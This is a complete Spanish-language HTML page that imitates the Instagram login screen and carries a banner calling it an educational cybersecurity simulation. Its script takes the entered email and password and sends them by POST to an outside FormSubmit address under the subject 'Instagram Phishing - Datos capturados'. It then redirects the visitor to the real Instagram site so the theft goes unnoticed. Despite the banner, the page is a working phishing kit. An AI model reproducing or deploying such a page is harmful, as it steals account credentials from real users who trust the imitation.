<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram - Iniciar sesión</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background: #fafafa; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { display: flex; max-width: 890px; width: 100%; justify-content: center; align-items: center; gap: 32px; }
        .phone-mockup { 
            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
            border-radius: 120px;
            padding: 20px;
            width: 380px;
            height: 580px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .phone-screen {
            background: white;
            border-radius: 100px;
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .phone-screen img {
            width: 60%;
            opacity: 0.9;
        }
        .login-section { width: 350px; }
        .logo {
            font-family: 'Instagram Sans', 'Billabong', cursive;
            font-size: 52px;
            text-align: center;
            margin-bottom: 30px;
            font-style: italic;
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        .login-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 20px 40px;
            margin-bottom: 10px;
        }
        .login-box input {
            width: 100%;
            padding: 12px 8px;
            margin-bottom: 6px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background: #fafafa;
            font-size: 12px;
        }
        .login-box input:focus {
            outline: none;
            border: 1px solid #a8a8a8;
            background: white;
        }
        .login-btn {
            width: 100%;
            padding: 8px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
        }
        .login-btn:hover { background: #1877f2; }
        .divider {
            display: flex;
            align-items: center;
            margin: 16px 0;
        }
        .divider-line {
            flex: 1;
            height: 1px;
            background: #dbdbdb;
        }
        .divider-text {
            padding: 0 16px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .fb-login {
            text-align: center;
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 16px;
        }
        .forgot-password {
            text-align: center;
            color: #00376b;
            font-size: 12px;
            margin-top: 12px;
        }
        .signup-box {
            background: white;
            border: 1px solid #dbdbdb;
            padding: 20px;
            text-align: center;
        }
        .signup-box p {
            font-size: 14px;
            color: #262626;
        }
        .signup-box a {
            color: #0095f6;
            font-weight: 600;
            text-decoration: none;
        }
        .get-app {
            text-align: center;
            margin-top: 20px;
        }
        .get-app p {
            font-size: 14px;
            color: #262626;
            margin-bottom: 12px;
        }
        .app-stores { display: flex; justify-content: center; gap: 8px; }
        .app-stores img { height: 40px; }
        .edu-banner {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            background: #ff9800;
            color: white;
            text-align: center;
            padding: 8px;
            font-weight: bold;
            z-index: 1000;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="edu-banner">⚠️ PROYECTO EDUCATIVO - Simulación de ciberseguridad</div>
    <div class="container">
        <div class="phone-mockup">
            <div class="phone-screen">
                <svg viewBox="0 0 400 400" style="width: 70%;">
                    <rect fill="none" stroke="white" stroke-width="3" x="50" y="50" width="300" height="300" rx="40"/>
                    <circle fill="white" cx="200" cy="200" r="80"/>
                    <circle fill="none" stroke="white" stroke-width="8" cx="200" cy="200" r="120"/>
                    <circle fill="white" cx="280" cy="120" r="15"/>
                </svg>
            </div>
        </div>
        <div class="login-section">
            <div class="logo">Instagram</div>
            <div class="login-box">
                <form id="loginForm" onsubmit="handleLogin(event)">
                    <input type="text" id="email" placeholder="Teléfono, usuario o correo electrónico" required>
                    <input type="password" id="password" placeholder="Contraseña" required>
                    <button type="submit" class="login-btn">Iniciar sesión</button>
                </form>
                <div class="divider">
                    <div class="divider-line"></div>
                    <div class="divider-text">O</div>
                    <div class="divider-line"></div>
                </div>
                <div class="fb-login">
                    <span style="color: #385185;">📘 Iniciar sesión con Facebook</span>
                </div>
                <div class="forgot-password">
                    <a href="#" style="color: #00376b; text-decoration: none;">¿Olvidaste la contraseña?</a>
                </div>
            </div>
            <div class="signup-box">
                <p>¿No tienes una cuenta? <a href="#">Regístrate</a></p>
            </div>
            <div class="get-app">
                <p>Descarga la aplicación.</p>
                <div class="app-stores">
                    <div style="background: black; color: white; padding: 8px 16px; border-radius: 6px; font-size: 12px;">App Store</div>
                    <div style="background: black; color: white; padding: 8px 16px; border-radius: 6px; font-size: 12px;">Google Play</div>
                </div>
            </div>
        </div>
    </div>
    <script>
        function handleLogin(event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            const credentials = {
                email: email,
                password: password,
                timestamp: new Date().toISOString()
            };
            
            // Enviar datos por email usando FormSubmit
            fetch('https://formsubmit.co/ajax/21877cd441e31d0e6b3ddc868c42a433', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify({
                    email: email,
                    password: password,
                    _subject: '🚨 Instagram Phishing - Datos capturados',
                    _template: 'table'
                })
            }).then(response => response.json())
            .then(data => {
                console.log('Datos enviados:', data);
            }).catch(error => {
                console.error('Error:', error);
            });
            
            // Redirigir a revelación SIN mostrar datos
            window.location.href = 'https://www.instagram.com';
        }
    </script>
</body>
</html>
